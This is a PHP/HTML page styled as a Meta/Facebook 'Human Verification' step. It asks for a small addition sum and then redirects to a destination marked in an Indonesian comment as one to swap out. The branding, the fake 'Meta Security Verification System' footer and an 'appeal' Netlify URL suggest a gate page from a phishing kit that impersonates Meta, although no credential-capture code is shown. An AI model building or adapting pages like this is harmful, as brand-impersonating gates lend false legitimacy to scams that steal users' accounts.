<?php
$a = rand(1, 15);
$b = rand(1, 15);
while (($a + $b) > 30) {
    $a = rand(1, 15);
    $b = rand(1, 15);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <!-- Title & Description -->
  <title>Human Verification - Meta Security</title>
  <meta name="description" content="Please complete the human verification process to continue securely.">
  <meta name="keywords" content="Meta, Facebook, Security, Human Verification, Login Security">

  <!-- Open Graph (OG) -->
  <meta property="og:title" content="Human Verification - Meta Security">
  <meta property="og:description" content="Please complete the human verification process to continue securely.">
  <meta property="og:image" content="assets/favicon-32x32.png">
  <meta property="og:url" content="https://api-v1-appeal.netlify.app/">
  <meta property="og:type" content="website">

  <!-- Twitter Card -->
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="Human Verification - Meta Security">
  <meta name="twitter:description" content="Please complete the human verification process to continue securely.">
  <meta name="twitter:image" content="assets/favicon-32x32.png">

  <!-- Favicon -->
  <link rel="apple-touch-icon" sizes="180x180" href="assets/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="assets/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="assets/favicon-16x16.png">
<link rel="manifest" href="assets/site.webmanifest">

  <!-- Fonts & Tailwind -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

  <style>
    body {
      font-family: 'Inter', sans-serif;
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen bg-gradient-to-b from-blue-600 to-blue-800">

  <div class="bg-white rounded-2xl shadow-2xl p-6 max-w-sm w-full text-center transform transition hover:scale-[1.02]">
    <!-- Icon -->
    <div class="flex justify-center mb-4">
      <div class="bg-blue-100 p-4 rounded-full shadow-md">
        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 14l9-5-9-5-9 5 9 5zm0 0l9-5-9-5-9 5 9 5zm0 0v6m0-6l-9-5 9-5 9 5-9 5z" />
        </svg>
      </div>
    </div>

    <!-- Title -->
    <h1 class="text-2xl font-bold mb-2 text-gray-800">Human Verification</h1>
    <p class="text-gray-600 mb-4">Please solve this math problem to prove you're not a robot</p>

    <!-- Card -->
    <div class="bg-gray-50 border rounded-xl p-4 mb-4 shadow-md">
      <p class="text-lg font-medium mb-2">Solve the simple addition problem to continue</p>
      <p class="text-2xl font-bold mb-4 text-blue-700"><?php echo $a; ?> + <?php echo $b; ?> = ?</p>
      <input type="number" id="answer" class="w-full border rounded-lg p-2 mb-3 text-center focus:ring-2 focus:ring-blue-400 focus:outline-none" placeholder="Your answer">
      <button id="verifyBtn" class="bg-blue-600 text-white font-semibold px-6 py-2 rounded-xl shadow-md hover:bg-blue-700 transition w-full">Verify</button>
    </div>

    <!-- Message -->
    <div id="message"></div>
    
    <p class="text-xs text-gray-400 mt-6">
      © 2025 Meta Security Verification System | All rights reserved
    </p>
  </div>

<script>
$(document).ready(function(){
    $("#verifyBtn").click(function(){
        let ans = $("#answer").val().trim();
        let correct = <?php echo $a + $b; ?>;
        $("#message").html("");

        if(ans === ""){
            $("#message").html('<p class="text-red-600 font-medium mt-3">Please enter your answer.</p>');
            return;
        }

        if(parseInt(ans) !== correct){
            $("#message").html('<p class="text-red-600 font-medium mt-3">Incorrect answer. Please try again.</p>');
            return;
        }

        $("#message").html('<p class="text-green-600 font-medium mt-3">Verification successful! Redirecting...</p>');
        setTimeout(function(){
            window.location.href = "https://google.com"; // ganti redirect tujuan
        }, 2000);
    });
});
</script>

</body>
</html>